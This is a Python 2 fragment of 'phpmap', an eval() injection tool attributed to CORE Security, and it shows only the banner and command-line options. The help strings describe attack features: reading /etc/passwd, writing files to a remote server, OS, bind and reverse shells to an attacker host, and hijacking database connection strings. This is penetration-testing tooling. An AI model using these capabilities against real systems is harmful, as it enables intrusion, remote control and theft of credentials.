#--
#
# Description:
#       This tool is used to exploit poorly sanitized user input in PHP 
#       web applications. 
#
#       Author: Level @ CORE Security Technologies, CORE SDI Inc.
#       Email: level@coresecurity.com
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#
#--

from optparse import OptionParser

class Options:
	def init(self):
		print """
-----------------------------------------------------------------
|      phpmap 0.3.0, eval() injection tool                      |
|      Level / CORE Security                                    |
-----------------------------------------------------------------

Here we go again..."""
		parser = OptionParser()
		#operation options
		parser.add_option("--url",dest="url",help="Target URL")#done
		parser.add_option("--forms",action="store_true",help="Discovers forms on target url")#done
		parser.add_option("--crawl",action="store_true",help="Builds a queue of forms to attack")#done
		parser.add_option("--restrict-domain",dest="restrict_domain",help="Allows restriction of the target domain")#done
		parser.add_option("--cookie",dest="cookieValue",help="Allows the use of an arbitrary cookie value")#done
		parser.add_option("--crawl-depth",dest="crawlDepth",help="Controls the crawler page depth")#review
		parser.add_option("--basic",dest="basicAuth",help="Enables basic authentication (ex 'user:pass')")#done
		#payload options
		parser.add_option("--fs-write",dest="fsWrite",help="Writes local file to the remote fs (ex: --fs-write='localFile.php:/var/www/html/remoteFile.php')")#done
		parser.add_option("--fs-read",dest="fsRead",help="Reads a file from the remote file system (ex: --fs-read='/etc/passwd')")#done
		parser.add_option("--os-shell",dest="osShell",help="Creates a non-interactive OS shell on the remote host")#done
		parser.add_option("--bind-shell",dest="bindShell",help="Bind to a port on the remote host with a OS shell (ex: --bind-shell='0.0.0.0:5555')")#done
		parser.add_option("--reverse-shell",dest="reverShell",help="Create a reverse OS shell to an attacker controlled host (ex: --reverse-shell='10.10.10.10:5555')")#done
		parser.add_option("--db-hook",dest="dbHook",help="Locate database connection strings in the www root, create malicious connection")#done
		parser.add_option("--fingerprint",action="store_true",help="Perform IG on the compromised remote host")
		parser.add_option("--clear-vuln-db",action="store_true",help="Deletes entries within the vuln database")#done
		(o, a) = parser.parse_args()
		return o, a
